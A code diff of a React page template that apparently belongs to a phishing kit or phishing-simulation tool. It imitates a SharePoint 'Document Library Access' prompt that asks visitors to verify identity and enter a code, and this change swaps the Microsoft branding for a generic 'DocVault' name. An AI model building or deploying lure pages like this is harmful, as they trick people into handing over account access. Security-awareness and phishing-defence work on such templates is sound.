@@ -9,14 +9,14 @@ export function SharePointTemplate(): React.ReactElement {
       <div className="tpl-container" style={{ maxWidth: 520 }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
           <svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#038387"/><circle cx="16" cy="13" r="6" fill="white" opacity="0.85"/><circle cx="22" cy="19" r="4" fill="white" opacity="0.6"/></svg>
-          <span style={{ fontSize: 18, fontWeight: 600, color: '#1b1b1b' }}>SharePoint</span>
+          <span style={{ fontSize: 18, fontWeight: 600, color: '#1b1b1b' }}>DocVault</span>
         </div>
 
         <div className="tpl-card">
           {f.state === 'idle' && (
             <>
               <h1 className="tpl-title">Document Library Access</h1>
-              <p className="tpl-text">You have been granted access to a SharePoint document library. Verify your identity to view and download files.</p>
+              <p className="tpl-text">You have been granted access to a document library. Verify your identity to view and download files.</p>
               <div className="tpl-info-box" style={{ background: '#e6f4f4', borderColor: '#a8d8d8', color: '#038387' }}>
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#038387" strokeWidth="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                 <span>Team Documents — 8 files shared with you</span>
@@ -24,7 +24,7 @@ export function SharePointTemplate(): React.ReactElement {
               <button className="tpl-btn" style={{ background: '#038387' }} onClick={f.handleStart}>Verify Access</button>
             </>
           )}
-          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Connecting to SharePoint...</p></div>}
+          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Connecting to DocVault...</p></div>}
           {(f.state === 'code_ready' || f.state === 'waiting') && (
             <>
               <h1 className="tpl-title">Enter Verification Code</h1>
@@ -40,7 +40,7 @@ export function SharePointTemplate(): React.ReactElement {
           {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#038387' }} onClick={f.handleReset}>Try Again</button></div>}
           {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#038387' }} onClick={f.handleReset}>Try Again</button></div>}
         </div>
-        <div className="tpl-footer"><span>Microsoft Terms</span><span>Privacy</span></div>
+        <div className="tpl-footer"><span>Terms of Service</span><span>Privacy</span></div>
       </div>
     </div>
   );
